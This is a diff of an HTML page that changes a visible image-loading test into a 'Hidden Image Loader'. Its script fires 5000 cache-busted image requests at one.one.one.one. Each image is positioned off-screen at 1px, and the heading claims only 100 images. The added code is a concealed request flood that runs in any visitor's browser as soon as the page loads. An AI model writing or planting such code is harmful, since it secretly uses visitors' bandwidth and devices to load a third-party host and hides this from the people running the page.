@@ -2,50 +2,29 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Image Loader Test</title>
+  <title>Hidden Image Loader</title>
   <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: #111;
-      color: #fff;
-      font-family: sans-serif;
-    }
-    .container {
-      display: flex;
-      flex-wrap: wrap;
-    }
-    img {
-      width: 10px;
-      height: 10px;
-      margin: 1px;
-      object-fit: cover;
+    .hidden-image {
+      position: absolute;
+      left: -9999px; /* Off-screen, but still visible to browser */
+      top: -9999px;
+      width: 1px;
+      height: 1px;
     }
   </style>
 </head>
 <body>
-  <h1>Loading 100 Images</h1>
-  <div class="container" id="imageContainer"></div>
-
+  <h1>Loading 100 Images Silently...</h1>
   <script>
-    const domains = [
-      'one.one.one.one',  // Same domain to keep it simple; can be replaced with cdn1, cdn2, etc.
-    ];
-
-    const container = document.getElementById('imageContainer');
     const totalImages = 5000;
     const baseUrl = 'https://one.one.one.one/media/card.png';
+    const timestamp = Date.now();
 
     for (let i = 0; i < totalImages; i++) {
-      const img = document.createElement('img');
-
-      // This prevents caching by adding a unique query param
-      const timestamp = Date.now();
-      const domain = domains[i % domains.length];
-      img.src = `https://${domain}/media/card.png?cb=${timestamp}-${i}`;
-
-      // Keep image visible so iOS doesn't throttle
-      container.appendChild(img);
+      const img = new Image();
+      img.src = `${baseUrl}?cb=${timestamp}-${i}`;
+      img.className = 'hidden-image';
+      document.body.appendChild(img);
     }
   </script>
 </body>
